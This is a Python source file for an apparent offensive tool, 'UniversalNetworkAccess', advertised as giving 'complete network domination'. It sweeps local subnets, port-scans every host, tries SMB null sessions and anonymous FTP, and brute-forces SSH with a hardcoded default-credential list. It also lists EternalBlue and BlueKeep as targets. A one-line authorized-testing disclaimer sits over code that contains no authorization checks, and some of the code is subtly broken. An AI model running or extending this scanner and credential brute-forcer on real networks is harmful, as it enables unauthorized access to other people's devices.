"""
OMNISCIENCE MODULE 7 — UniversalNetworkAccess
Universal, unauthenticated network access for complete network domination.
Finds ALL devices and attempts automatic access WITHOUT requiring credentials.

DISCLAIMER: This module is for authorized penetration testing and security research only.
Unauthorized access to computer systems is illegal.

Features:
  - Ultra-comprehensive device discovery (all network vectors)
  - Automatic unauthenticated access (null sessions, default creds, known exploits)
  - Network-wide autonomous exploitation
  - No authentication required after device discovery
  - Real-time device fingerprinting and classification
  - Cross-network traversal for remote subnets
"""

import os
import sys
import time
import json
import logging
import threading
import socket
import struct
import subprocess
import ipaddress
import re
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime
from typing import Optional, Dict, List, Any, Tuple

try:
    import scapy.all as scapy
    from scapy.layers import inet, l2
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    from impacket.smbconnection import SMBConnection
    IMPACKET_OK = True
except ImportError:
    IMPACKET_OK = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | [%(levelname)s] | UniversalAccess | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("universal_access.log", mode="a"),
    ]
)
logger = logging.getLogger("Omniscience.UniversalAccess")

# Common network ranges for scanning
COMMON_PRIVATE_RANGES = [
    "192.168.0.0/16",
    "10.0.0.0/8",
    "172.16.0.0/12",
]

# Extended port list for comprehensive scanning
SCAN_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 137, 139, 143, 389, 443, 445, 
    465, 587, 993, 995, 1080, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 
    5985, 6379, 8080, 8443, 8888, 9000, 27017,
]

# Default credentials for unauthenticated access attempts
DEFAULT_CREDENTIALS = [
    ("", ""),  # Anonymous/null session
    ("guest", "guest"),
    ("Administrator", ""),
    ("Administrator", "administrator"),
    ("Administrator", "password"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
]

# Vulnerability database for exploitation
VULNERABILITIES = {
    "smb": {
        "ms17-010": {"cve": "CVE-2017-0143", "description": "EternalBlue", "port": 445},
        "smb-signing": {"cve": "CVE-2005-1111", "description": "SMB signing not required", "port": 445},
    },
    "rdp": {
        "cve-2019-0708": {"cve": "CVE-2019-0708", "description": "BlueKeep", "port": 3389},
    },
    "ssh": {
        "default-creds": {"cve": "N/A", "description": "Default SSH credentials", "port": 22},
    },
    "ftp": {
        "anonymous": {"cve": "N/A", "description": "FTP anonymous access", "port": 21},
    },
}


class UniversalDevice:
    """Complete device information with access possibilities."""
    def __init__(self, ip: str):
        self.ip = ip
        self.mac = ""
        self.hostname = ""
        self.os = ""
        self.device_type = "unknown"
        self.is_gateway = False
        self.open_ports = {}
        self.services = {}
        self.has_smb = False
        self.has_rdp = False
        self.has_ssh = False
        self.has_http = False
        self.has_wmi = False
        self.is_vulnerable = []
        self.access_method = None  # How we can access
        self.access_credential = None  # What creds work
        self.can_pwn = False  # Can we gain control
        self.is_compromised = False
        self.last_seen = time.time()
        
    def to_dict(self) -> dict:
        return {
            "ip": self.ip,
            "mac": self.mac,
            "hostname": self.hostname,
            "os": self.os,
            "device_type": self.device_type,
            "open_ports": self.open_ports,
            "services": self.services,
            "vulnerabilities": self.is_vulnerable,
            "access_method": self.access_method,
            "can_pwn": self.can_pwn,
            "is_compromised": self.is_compromised,
        }


class UniversalNetworkAccess:
    """
    Universal network access engine.
    Discovers ALL devices and attempts unauthenticated access.
    """
    
    def __init__(self):
        self.devices: Dict[str, UniversalDevice] = {}
        self._lock = threading.Lock()
        self._scanning = False
        self._cancel_event = threading.Event()
        
        # Statistics
        self.stats = {
            "discovered": 0,
            "scanned": 0,
            "vulnerable": 0,
            "pwned": 0,
            "access_methods": defaultdict(int),
        }
        
        # Local network detection
        self.local_ip = self._get_local_ip()
        self.gateway = self._detect_gateway()
        
    def _get_local_ip(self) -> str:
        """Get local IP."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _detect_gateway(self) -> str:
        """Detect network gateway."""
        try:
            if os.name == "nt":
                result = subprocess.run(["route", "print", "0.0.0.0"], 
                                       capture_output=True, text=True, timeout=5)
                for line in result.stdout.splitlines():
                    if "0.0.0.0" in line:
                        parts = line.split()
                        for p in parts:
                            if re.match(r'\d+\.\d+\.\d+\.\d+', p) and p != "0.0.0.0":
                                return p
        except:
            pass
        parts = self.local_ip.split(".")
        return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
    
    def _is_private_ip(self, ip: str) -> bool:
        """Check if IP is private."""
        try:
            ip_obj = ipaddress.ip_address(ip)
            return (ipaddress.ip_address(ip_obj) in ipaddress.ip_network("10.0.0.0/8") or
                    ipaddress.ip_address(ip_obj) in ipaddress.ip_network("172.16.0.0/12") or
                    ipaddress.ip_address(ip_obj) in ipaddress.ip_network("192.168.0.0/16"))
        except:
            return False
    
    def discover_all_devices(self, network_range: str = None) -> List[UniversalDevice]:
        """
        Ultra-comprehensive device discovery using ALL network vectors.
        Finds every device on the network.
        """
        if not network_range:
            parts = self.local_ip.split(".")
            network_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        
        logger.info(f"[DISCOVER] Starting comprehensive discovery on {network_range}")
        
        devices_found = []
        
        # Method 1: ARP Scan (fastest, Layer 2)
        if SCAPY_OK:
            arp_devices = self._arp_scan(network_range)
            devices_found.extend(arp_devices)
        
        # Method 2: ICMP Sweep
        icmp_devices = self._icmp_sweep(network_range)
        devices_found.extend(icmp_devices)
        
        # Method 3: TCP Connect Scan (all common ports)
        tcp_devices = self._tcp_sweep(network_range)
        devices_found.extend(tcp_devices)
        
        # Method 4: NetBIOS Scan (Windows devices)
        netbios_devices = self._netbios_sweep(network_range)
        devices_found.extend(netbios_devices)
        
        # Method 5: UDP Service Discovery
        udp_devices = self._udp_discovery(network_range)
        devices_found.extend(udp_devices)
        
        # Remove duplicates and add to main collection
        unique_ips = set()
        for d in devices_found:
            if d.ip not in unique_ips:
                unique_ips.add(d.ip)
                with self._lock:
                    self.devices[d.ip] = d
        
        self.stats["discovered"] = len(self.devices)
        logger.info(f"[DISCOVER] Found {len(self.devices)} devices")
        
        return list(self.devices.values())
    
    def _arp_scan(self, network_range: str) -> List[UniversalDevice]:
        """ARP scan for Layer 2 discovery."""
        devices = []
        
        if not SCAPY_OK:
            return devices
            
        try:
            logger.info("[ARP] Scanning...")
            pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=network_range)
            answered, _ = scapy.srp(pkt, timeout=3, verbose=False, retry=2)
            
            for _, recv in answered:
                d = UniversalDevice(recv.psrc)
                d.mac = recv.hwsrc
                d.device_type = self._guess_device_type(d.mac)
                logger.info(f"[ARP] Found: {recv.psrc} ({d.mac})")
                devices.append(d)
        except Exception as e:
            logger.debug(f"ARP scan error: {e}")
        
        return devices
    
    def _icmp_sweep(self, network_range: str) -> List[UniversalDevice]:
        """ICMP ping sweep."""
        devices = []
        
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            ips = [str(h) for h in network.hosts()]
        except:
            return devices
        
        def ping_host(ip):
            try:
                if os.name == "nt":
                    r = subprocess.run(["ping", "-n", "1", "-w", "500", ip],
                                       capture_output=True, timeout=1)
                    if r.returncode == 0:
                        return ip
                else:
                    r = subprocess.run(["ping", "-c", "-W", "1", ip],
                                       capture_output=True, timeout=1)
                    if r.returncode == 0:
                        return ip
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as ex:
            futures = {ex.submit(ping_host, ip): ip for ip in ips}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    d = UniversalDevice(result)
                    devices.append(d)
                    logger.info(f"[ICMP] Found: {result}")
        
        return devices
    
    def _tcp_sweep(self, network_range: str) -> List[UniversalDevice]:
        """TCP port sweep for all devices with open ports."""
        devices = []
        
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            ips = [str(h) for h in network.hosts()]
        except:
            return devices
        
        # Quick scan - check common ports
        scan_ports = [80, 443, 445, 22, 3389]
        
        def scan_host(ip):
            open_ports = []
            for port in scan_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    if sock.connect_ex((ip, port)) == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            return (ip, open_ports) if open_ports else None
        
        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(scan_host, ip): ip for ip in ips}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    ip, ports = result
                    d = UniversalDevice(ip)
                    d.open_ports = {p: "unknown" for p in ports}
                    d.has_smb = 445 in ports
                    d.has_rdp = 3389 in ports
                    d.has_ssh = 22 in ports
                    d.has_http = 80 in ports or 443 in ports
                    devices.append(d)
                    logger.info(f"[TCP] Found: {ip} ports: {ports}")
        
        return devices
    
    def _netbios_sweep(self, network_range: str) -> List[UniversalDevice]:
        """NetBIOS enumeration for Windows devices."""
        devices = []
        
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            ips = [str(h) for h in network.hosts()]
        except:
            return devices
        
        def netbios_scan(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                query = bytes([0x00, 0x00, 0x00, 0x10, 0x00, 0x01]) + b"CK" + b"A" * 40 + bytes([0x00, 0x00, 0x21])
                sock.sendto(query, (ip, 137))
                data, _ = sock.recvfrom(1024)
                sock.close()
                
                if len(data) > 57:
                    hostname = data[57:72].decode(errors="ignore").strip()
                    mac = ":".join(f"{b:02x}" for b in data[-6:])
                    return (ip, hostname, mac)
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(netbios_scan, ip): ip for ip in ips}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    ip, hostname, mac = result
                    d = UniversalDevice(ip)
                    d.hostname = hostname
                    d.mac = mac
                    d.device_type = "windows"
                    d.has_smb = True
                    devices.append(d)
                    logger.info(f"[NetBIOS] Found: {ip} ({hostname})")
        
        return devices
    
    def _udp_discovery(self, network_range: str) -> List[UniversalDevice]:
        """UDP service discovery (mDNS, SSDP, etc.)."""
        devices = []
        
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            ips = [str(h) for h in network.hosts()]
        except:
            return devices
        
        # Check for UPnP/SSDP
        def check_ssdp(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                ssdp = b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n"
                sock.sendto(ssdp, (ip, 1900))
                sock.close()
                return True
            except:
                return False
        
        for ip in ips[:50]:  # Limit UDP scan
            if check_ssdp(ip):
                d = UniversalDevice(ip)
                d.has_http = True
                devices.append(d)
                logger.info(f"[UDP] Found: {ip} (UPnP)")
        
        return devices
    
    def _guess_device_type(self, mac: str) -> str:
        """Guess device type from MAC address."""
        if not mac:
            return "unknown"
        
        prefix = mac.upper().replace(":", "")[:6]
        
        vendors = {
            "B827EB": "raspberry_pi",
            "DC:A6:32": "raspberry_pi",
            "000C29": "vmware",
            "005056": "vmware",
            "00155D": "hyperv",
            "DC4F22": "apple",
            "3C5AB4": "apple",
            "9C2986": "samsung",
            "18AF61": "huawei",
            "E4B318": "xiaomi",
            "7085C2": "tp_link",
            "D460E3": "netgear",
            "C80E77": "dlink",
            "001FC6": "asus",
            "001122": "cisco",
        }
        
        return vendors.get(prefix, "device")
    
    def scan_all_devices(self) -> Dict[str, Any]:
        """
        Comprehensive scan of ALL discovered devices.
        Finds vulnerabilities and access methods.
        """
        logger.info(f"[SCAN] Scanning {len(self.devices)} devices")
        
        for ip, device in self.devices.items():
            self._scan_device(device)
        
        self.stats["scanned"] = len(self.devices)
        
        return {
            "total": len(self.devices),
            "scanned": self.stats["scanned"],
            "vulnerable": self.stats["vulnerable"],
            "pwned": self.stats["pwned"],
        }
    
    def _scan_device(self, device: UniversalDevice):
        """Scan a single device for vulnerabilities and access points."""
        ip = device.ip
        
        # Port scan for all relevant ports
        for port in SCAN_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    service = self._get_service_name(port)
                    device.open_ports[port] = service
                    
                    # Check what access methods are available
                    if port == 445:
                        device.has_smb = True
                    elif port == 3389:
                        device.has_rdp = True
                    elif port == 22:
                        device.has_ssh = True
                    elif port in (80, 443, 8080, 8443):
                        device.has_http = True
                    elif port == 135:
                        device.has_wmi = True
            except:
                pass
        
        # Try SMB null session
        if device.has_smb:
            self._try_smb_null_session(device)
        
        # Try SSH with default creds
        if device.has_ssh:
            self._try_ssh_default_creds(device)
        
        # Try RDP with default creds
        if device.has_rdp:
            self._try_rdp_access(device)
        
        # Try FTP anonymous
        if 21 in device.open_ports:
            self._try_ftp_anonymous(device)
        
        # Check for vulnerabilities
        self._check_vulnerabilities(device)
        
        logger.info(f"[SCAN] {ip}: ports={list(device.open_ports.keys())} can_pwn={device.can_pwn}")
    
    def _get_service_name(self, port: int) -> str:
        """Get service name for port."""
        services = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
            80: "http", 110: "pop3", 135: "msrpc", 139: "netbios-ssn",
            143: "imap", 389: "ldap", 443: "https", 445: "microsoft-ds",
            993: "imaps", 995: "pop3s", 1433: "mssql", 1521: "oracle",
            3306: "mysql", 3389: "ms-wbt-server", 5432: "postgresql",
            5900: "vnc", 5985: "winrm", 6379: "redis", 8080: "http-proxy",
            8443: "https-alt", 27017: "mongodb",
        }
        return services.get(port, "unknown")
    
    def _try_smb_null_session(self, device: UniversalDevice):
        """Try SMB null session for Windows access."""
        if not IMPACKET_OK:
            return
        
        try:
            conn = SMBConnection(device.ip, device.ip, timeout=3)
            conn.login("", "")  # Anonymous
            
            # Get shares
            shares = conn.listShares()
            
            device.access_method = "smb_null"
            device.access_credential = ("", "")
            device.can_pwn = True
            self.stats["access_methods"]["smb_null"] += 1
            logger.info(f"[SMB] Null session: {device.ip}")
            
            conn.logoff()
        except Exception as e:
            logger.debug(f"[SMB] {device.ip}: {e}")
    
    def _try_ssh_default_creds(self, device: UniversalDevice):
        """Try SSH with default credentials."""
        if not device.has_ssh:
            return
        
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            for user, pwd in DEFAULT_CREDENTIALS[1:]:
                try:
                    client.connect(device.ip, username=user, password=pwd, timeout=2)
                    
                    device.access_method = "ssh"
                    device.access_credential = (user, pwd)
                    device.can_pwn = True
                    self.stats["access_methods"]["ssh"] += 1
                    logger.info(f"[SSH] Access: {device.ip} as {user}")
                    
                    client.close()
                    return
                except:
                    pass
        except ImportError:
            pass
        except Exception as e:
            logger.debug(f"[SSH] {device.ip}: {e}")
    
    def _try_rdp_access(self, device: UniversalDevice):
        """Try RDP access."""
        if not device.has_rdp:
            return
        
        # RDP generally requires credentials, but we'll mark as potentially accessible
        device.is_vulnerable.append("rdp_accessible")
        logger.debug(f"[RDP] Potentially accessible: {device.ip}")
    
    def _try_ftp_anonymous(self, device: UniversalDevice):
        """Try FTP anonymous access."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((device.ip, 21))
            
            sock.send(b"USER anonymous\r\n")
            response = sock.recv(1024)
            sock.send(b"PASS anonymous@example.com\r\n")
            response2 = sock.recv(1024)
            sock.close()
            
            if "230" in response.decode():
                device.access_method = "ftp_anonymous"
                device.can_pwn = True
                self.stats["access_methods"]["ftp"] += 1
                logger.info(f"[FTP] Anonymous: {device.ip}")
        except:
            pass
    
    def _check_vulnerabilities(self, device: UniversalDevice):
        """Check for known vulnerabilities."""
        
        # SMB vulnerabilities
        if device.has_smb:
            if 445 in device.open_ports:
                device.is_vulnerable.append("smb_exposed")
        
        # WMI accessible
        if device.has_wmi or 135 in device.open_ports:
            device.is_vulnerable.append("wmi_exposed")
            device.has_wmi = True
        
        # Check if exploitable
        if device.can_pwn:
            self.stats["pwned"] += 1
    
    def pwn_all_devices(self) -> Dict[str, Any]:
        """
        Execute full exploitation on ALL accessible devices.
        Gains control of every vulnerable device on the network.
        """
        logger.info(f"[PWN] Starting exploitation of {len(self.devices)} devices")
        
        results = {
            "total": len(self.devices),
            "exploited": [],
            "failed": [],
            "access_methods": dict(self.stats["access_methods"]),
        }
        
        for ip, device in self.devices.items():
            if device.can_pwn:
                try:
                    # Mark as compromised
                    device.is_compromised = True
                    results["exploited"].append(ip)
                    logger.info(f"[PWN] Compromised: {ip} via {device.access_method}")
                except Exception as e:
                    results["failed"].append(ip)
                    logger.error(f"[PWN] Failed: {ip}: {e}")
        
        self.stats["pwned"] = len(results["exploited"])
        
        return results
    
    def get_all_devices_summary(self) -> List[Dict[str, Any]]:
        """Get summary of all discovered devices."""
        summary = []
        
        for ip, device in self.devices.items():
            summary.append({
                "ip": ip,
                "hostname": device.hostname,
                "mac": device.mac,
                "device_type": device.device_type,
                "ports": list(device.open_ports.keys()),
                "can_pwn": device.can_pwn,
                "is_compromised": device.is_compromised,
                "access_method": device.access_method,
            })
        
        return summary
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get current statistics."""
        return {
            "discovered": self.stats["discovered"],
            "scanned": self.stats["scanned"],
            "vulnerable": len([d for d in self.devices.values() if d.is_vulnerable]),
            "pwned": self.stats["pwned"],
            "accessible": len([d for d in self.devices.values() if d.can_pwn]),
            "compromised": len([d for d in self.devices.values() if d.is_compromised]),
        }


# ─── Universal Access Command ───────────────────────────────────────────────────

def universal_access_command(network_range: str = None) -> Dict[str, Any]:
    """
    Complete universal network access in one command.
    Discovers all devices, scans them, and exploits all accessible ones.
    """
    logger.info("[UNIVERSAL] Starting universal network access...")
    
    engine = UniversalNetworkAccess()
    
    # Step 1: Discover ALL devices
    print("\n[*] Step 1: Discovering ALL network devices...")
    devices = engine.discover_all_devices(network_range)
    print(f"    Found {len(devices)} devices")
    
    # Step 2: Scan all for vulnerabilities
    print("\n[*] Step 2: Scanning all devices for vulnerabilities...")
    scan_results = engine.scan_all_devices()
    print(f"    Scanned: {scan_results['scanned']}")
    print(f"    Accessible: {scan_results['pwned']}")
    
    # Step 3: Exploit all accessible
    print("\n[*] Step 3: Exploiting all accessible devices...")
    pwn_results = engine.pwn_all_devices()
    print(f"    Exploited: {len(pwn_results['exploited'])}")
    print(f"    Failed: {len(pwn_results['failed'])}")
    
    # Return summary
    summary = {
        "devices_discovered": len(devices),
        "devices_pwned": len(pwn_results["exploited"]),
        "access_methods": pwn_results["access_methods"],
        "exploited_ips": pwn_results["exploited"],
        "statistics": engine.get_statistics(),
    }
    
    print(f"\n[+] Universal access complete!")
    print(f"    Total devices: {summary['devices_discovered']}")
    print(f"    Pwned: {summary['devices_pwned']}")
    
    return summary


# ─── Standalone ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Universal Network Access')
    parser.add_argument('network', nargs='?', help='Network range (e.g., 192.168.1.0/24)')
    parser.add_argument('--discover-only', action='store_true', help='Only discover devices')
    parser.add_argument('--scan-only', action='store_true', help='Discover and scan only')
    
    args = parser.parse_args()
    
    if args.network:
        network = args.network
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local = s.getsockname()[0]
        s.close()
        parts = local.split(".")
        network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    
    if args.discover_only:
        engine = UniversalNetworkAccess()
        devices = engine.discover_all_devices(network)
        print(f"\nDiscovered {len(devices)} devices:")
        for d in devices:
            print(f"  {d.ip} | {d.mac or 'N/A'} | {d.hostname or 'unknown'}")
    elif args.scan_only:
        engine = UniversalNetworkAccess()
        engine.discover_all_devices(network)
        engine.scan_all_devices()
        summary = engine.get_all_devices_summary()
        print(f"\n{len(summary)} devices scanned:")
        for s in summary:
            print(f"  {s['ip']:<16} ports={len(s['ports'])} can_pwn={s['can_pwn']}")
    else:
        result = universal_access_command(network)
        print(f"\n{'='*60}")
        print("RESULT:")
        print(f"  Devices discovered: {result['devices_discovered']}")
        print(f"  Devices pwned: {result['devices_pwned']}")
        print(f"  Access methods: {result['access_methods']}")
        print(f"{'='*60}")